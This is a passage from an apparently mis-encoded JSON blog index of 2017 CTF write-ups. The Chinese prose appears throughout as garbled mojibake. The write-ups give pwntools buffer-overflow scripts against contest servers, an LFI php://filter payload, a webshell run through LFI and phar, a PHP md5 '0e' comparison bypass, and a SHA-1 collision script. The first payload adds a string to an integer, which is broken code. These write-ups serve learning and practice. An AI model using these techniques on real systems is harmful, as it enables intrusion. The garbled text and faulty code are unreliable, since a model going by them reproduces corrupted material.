(æœ€éºæ†¾çš„ä¸€å€‹é¡åˆ¥)\n\n### water-impossible\nåœ¨é¡Œç›®æœ‰çµ¦äº†åŸå§‹ç¢¼å’Œ binaryï¼Œåœ¨åŸå§‹ç¢¼çœ‹åˆ°å¦‚æœ `(int token) == 6666`\né€™å€‹æª¢æŸ¥æœ‰éï¼Œå°±æœƒå™´ FLAG\n(ä¿è­·åªæœ‰é–‹ NX)\n\næ‰€ä»¥åˆ©ç”¨ cyclic ç¢ºå®šå¯ä»¥è“‹åˆ° token ï¼Œä¸¦ä¸”çŸ¥é“ offset æ˜¯ 28ï¼Œæ‰€ä»¥\nPayload:\n```python\n#!/usr/bin/env python\n\nr = remote('bamboofox.cs.nctu.edu.tw', 58799)\n\npayload = 'a'*28 + 0x00001a0a\nr.recvuntil(':')\nr.sendline(payload)\nr.interactive()\n```\n\nRank: 21 (6l0ry)","categories":["writeup","CTF","bamboofox","2017"]},{"title":"HITCON2017-Bamboofox Wargame","url":"/zh-tw/2017/hitcon-2017-bamboofox/","content":"\nåªè§£å‡ºå…©é¡Œ, å‰©ä¸‹çš„å› ç‚ºæˆ‘å¤ªå»¢ä¸æœƒç¹ä¿è­·æ‰€ä»¥æ²’è§£QQ\n\n<!-- more -->\n\n## Forensic [100]\n### Description:\n```é€™å¼µç…§ç‰‡æ‡‰è©²è¦æœ‰æ——å­åœ¨ä¸Šé¢çš„é˜¿ï¼Œå¥‡æ€ª?\nè½èªªä»–è¢«è£å‰ªéï¼Œä¸éå¥½åƒä¸æ˜¯ç”¨æ­£è¦çš„åœ–ç‰‡ç·¨è¼¯è»Ÿé«”è™•ç†çš„ï¼ŒçœŸæ˜¯çš„...æ€éº¼è£å‰ªçš„é€™éº¼æš´åŠ›...\næ‹œè¨—äº†ï¼Œå¹«æˆ‘æŠŠæ——å­æ‰¾å‡ºä¾†ï¼Œä¸ç„¶...\nç­‰ç­‰æœ‰äººä¾†äº†...å¿«èº²èµ·ä¾†...\n( ç€è¦½å™¨ä¸Šé¢ç€è¦½å¯èƒ½æ˜¯é»‘çš„ï¼Œå»ºè­°è¼‰ä¸‹ä¾†çœ‹å–” )\n```\n\né€™é¡Œé¡Œç›®å·²ç¶“æç¤ºè¦æ”¹åœ–ç‰‡é«˜åº¦æ‰€ä»¥åœ¨hexeditorä¸­æ‰¾åˆ°pngçš„å¯¬é«˜è¨­å®š [pngæ ¼å¼èªªæ˜æ›¸](http://www.w3.org/TR/PNG/#11IHDR)\næ‰€ä»¥æŠŠé«˜å¢åŠ åˆ°æƒ³è¦çš„é«˜åº¦(in HEX)\nç„¶å¾Œå†ç”¨pngcheckæŠŠCRCé‡æ–°ç®—ä¸€éå†æ›´æ­£å°±å¯ä»¥å›‰\n\n\n## Pwn [100]\n### Description:\n```\nnc bamboofox.cs.nctu.edu.tw 22001\n\nFLAG åœ¨ /home/ctf åº•ä¸‹\n\næ­¡è¿ä¾†åˆ° PWN çš„ä¸–ç•Œ\næ©...é€™é¡Œå°±æ˜¯ buffer overflow çš„åŸºç¤ç°¡å–®å…¥é–€é¡Œ\næœ‰å“ªé‚Šä¸æœƒå¯ä»¥ä¾†æˆ‘å€‘åœ¨ HITCON çš„æ”¤ä½å•å•é¡Œå–”\næœƒçš„äººæ‡‰è©² 1 åˆ†é˜å°±è§£å®Œäº†å§?\næ©æˆ‘å»¢è©±å¥½å¤šå–”...\nç¸½ä¹‹å°±æ˜¯æƒ³è¾¦æ³•æ‹¿åˆ° FLAG å§\n```\nä¸»è¾¦æ–¹å¾ˆä½›å¿ƒåœ°çµ¦äº†src\n\né€™é¡Œé¡Œç›®å¾ˆå¥½å¿ƒçš„çµ¦äº†åŸå§‹ç¢¼ ~~é‚£å°±ä¸é–‹gdbäº†~~\n\né€™é¡Œé¡Œç›®æ˜¯è€ƒ`LIFO+BOF`\nåœ¨è¨˜æ†¶é«”è£¡é•·é€™æ¨£:\n```\n+----------------+\n|                |\n|                |\n|      text      |  <-- text's buffer (40byte)\n|                |\n|                |\n| -------------- |\n| to_be_overflow |  <-- to_be_overflow's pointer\n+----------------+\n```\nåœ¨ç¨‹å¼ä¸­`to_be_overflow`å¿…é ˆç­‰æ–¼`0xABCD1234`æ‰æœ‰shell\næ‰€ä»¥åªè¦åœ¨textçš„bufferå¡æ»¿åƒåœ¾, åœ¨æŠŠ`to_be_overflow`è“‹æ‰ç›´æ¥è®Šæˆ`0xABCD1234`å°±å¯ä»¥å–å¾—shell\n\næ‰€ä»¥payloadæœƒé•·é€™æ¨£:\n```python\n#!/usr/bin/env python\n\nfrom pwn import *\n\nr = remote('bamboofox.cs.nctu.edu.tw', '22001')\n\nr.sendline('A'*40 + '\\x34\\x12\\xCD\\xAB')\n\nr.interactive()\n```\n","categories":["writeup","wargame","hitcon-2017-bamboofox"]},{"title":"AIS3 Pre-Exam 2017","url":"/zh-tw/2017/ais3-2017/","content":"\n\n\né€™æ¬¡æ˜¯æˆ‘ç¬¬ä¸€æ¬¡ç©AIS3 Pre-Exam,é›£åº¦æ²’æœ‰ç‰¹åˆ¥é›£<del>ä»¥webä¾†èªªæ‹‰</del>.\nè§£é¡Œçš„æ™‚å€™æœ‰å¡äº†ä¸€ä¸‹ä¸‹<del>å¯¦éš›ä¸Šæ˜¯ä¸€æ•´å¤©</del>\nä»¥ä¸‹æ˜¯æœ‰è§£å‡ºä¾†çš„write-up\n\n<!-- more -->\n\n`FLAGå’Œé¡Œç›®å¤§å¤šéƒ½å¿˜è¨˜ä¿å­˜äº†QQ,æ‰€ä»¥é€™ç¯‡åªå¯«å‡ºæƒ³æ³•å’Œå¤§æ¦‚è§£æ³•QQ`\n\n# MISC\n\n## MISC1\nåªæ˜¯å€‹ç°½åˆ°é¡Œ\n## MISC2\n<del>é€™é¡Œçš„å‡ºé¡Œè€…çµ¦æˆ‘å‡ºä¾†QQ, é€™èŠ±äº†æˆ‘å¿«ä¸€å¤©çš„æ™‚é–“QQ</del>\né¡Œç›®åªå¯«äº†é é¢`I've sent you something :)`\nä¸€é–‹å§‹çœ‹åŸå§‹ç¢¼ä¸€çœ‹å°±çœ‹åˆ°`<!-- <img src=sudodu.png /> -->`\nä¸€é–‹å§‹çš„åªè¦ºå¾—æ‡‰è©²æ˜¯å€‹Stegoé¡Œ\nçµæœä¸è«–æ˜¯ç”¨`exiftool`, `binwalk`, `strings`éƒ½æ²’æœ‰å‡ºç¾ä»»ä½•ç‰¹åˆ¥çš„åœ°æ–¹\nç›´åˆ°æœ‰ä¸€æ¬¡ç„¡èŠå–µäº†ä¸€ä¸‹çœ‹åˆ°headerç™¼ç¾æœ‰å‚³äº†ä¸€ä¸²é¡ä¼¼ä»¥base64ç·¨ç¢¼çš„å­—ä¸²\nè§£å‡ºä¾†å¾Œçš„ç¢ºæ˜¯base64ç·¨ç¢¼çš„,çµæœæ˜¯ä¸€å€‹è³‡æ–™å¤¾, è³‡æ–™å¤¾è£¡é¢æœ‰ä¸€å¼µç…§ç‰‡\nä¸‹è¼‰ä¸‹ä¾†å³å¯ç™¼ç¾FLAG\nFLAG = `AIS3{pika}`\n\n# WEB\n## WEB1\né¡Œç›®åªå¯«äº†`Didn't You See The Flag?`\nç”¨curlå°±æœƒå™´FLAGäº†\n\n## WEB2\né¡Œç›®ç‚ºä¸€å€‹ç™»å…¥ç•«é¢,DBå·²ç¶“å¯«æ­»åœ¨Source Codeè£¡äº†\nçœ‹äº†ä¸€ä¸‹Source Codeæ˜¯\n```php\n    md5(%password) == $row['password']\n```\nå¾Œä¾†Googleäº†ä¸€ä¸‹,ç™¼ç¾æ˜¯PHP`==`çš„ä¸€äº›å•é¡Œ\n([Source](http://momomoxiaoxi.com/2016/07/07/CTFWeb/#2-md5ç¢°æ’))\n([CTFå¯¦ä¾‹](http://www.nobbd.de/blog/artikel.php?titel=write-up-Internetwache-CTF-2016---All-5-web-challenges))\nä¸¦ä¸”åœ¨DBæ‰¾åˆ°äº†MD5ç·¨ç¢¼é–‹é ­ç‚º0eçš„å¯†ç¢¼\næ‰€ä»¥ä»¥0eç·¨ç¢¼çš„æ˜ç¢¼å†åŠ ä¸Šç›¸å°æ‡‰çš„usernameå°±å¯ä»¥å–å¾—flag\n## WEB3 & WEB4\nå…©å€‹æ˜¯åŒä¸€å€‹ç¶²ç«™\n\n### WEB3(Flag1)\nçœ‹äº†ä¸€ä¸‹ç™¼ç¾å¥½åƒæœ‰LFIçš„æ¼æ´\nå°±é–‹å§‹ä¸æ–·çš„çŒœflagçš„ä½ç½®\n<del>çŒœäº†å¿«ä¸€å¤©</del>\næ‰ç™¼ç¾å°±åœ¨index\n`payload => $domain/?p=php://filter/convert.base64-encode/resource=index`\n\n### WEB4(Flag2)\nçœ‹äº†ä¸€ä¸‹indexçš„å…§å®¹\nç™¼ç¾Flag2çš„ç·šç´¢\næœ‰å€‹`uploaddddddd`çš„é é¢\nç™¼ç¾å¯èƒ½æ˜¯è¦ä¸Šå‚³webshell\nä½†æ˜¯ä¸è«–æ€éº¼è©¦éƒ½ä¸è¡Œé(æ”¹content-type, é›™å‰¯æª”å)\nå¾Œä¾†æ‰çŸ¥é“è¦ç”¨pharçš„å”å®š\nå£“ç¸®webshellæˆzipæª”,æ”¹é™„æª”åæˆ.jpg,åˆ©ç”¨LFI+pharåŸ·è¡Œwebshell\n`the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l` é€™å€‹é é¢å°±æ”¾flag\né€²å»ä¸€çœ‹å°±å¯ä»¥çœ‹åˆ°Flag2\n\n# CRYPTO\n## CRYPTO 3\nç¨‹å¼ç¢¼:`(æˆ‘ä¸æœƒå¯«php code QQ(æ„æ€æœ‰åˆ°å°±å¥½))`\n```php\nh1 = $_POST[\"username\"]\nh2 = $_POST[\"password\"]\nif h1 = h2;\n    die $flag\n```\nç›´è¦ºå°±æ˜¯SHA1 Collision\n[(Source)](https://shattered.io/)\nåœ¨ç¶²è·¯ä¸Šæ”¹ä¸€ä¸‹scriptå°±æœƒå™´å‡ºflagäº†\n```python\nimport requests\nimport urllib2\nrotimi = urllib2.urlopen(\"http://shattered.io/static/shattered-1.pdf\").read()[:500]\nletmein = urllib2.urlopen(\"http://shattered.io/static/shattered-2.pdf\").read()[:500]\npayload = {'username': rotimi, 'password': letmein}\nr = requests.post('https://quiz.ais3.org:32670', data=payload)\nprint r.text\n```\n\n# ç¸½çµ\né€™æ¬¡AIS3çš„åˆé«”é©—æˆ‘è¦ºå¾—æŒºå¥½ç©çš„\n<del>é›–ç„¶åªæœ‰127åQQ</del>\nå› ç‚ºè‡ªå·±Reverseè·Ÿpwnçš„åº•å­é‚„ä¸å¤ ,æ‰€ä»¥æ‰“å®Œwebè·Ÿmiscå°±ä¸ç¹¼çºŒæ‰“äº†\næ˜å¹´å¸Œæœ›è‡ªå·±èƒ½å¤ çµ¦åŠ›é»QQ\n\n","categories":["writeup","AIS3","2017"]}]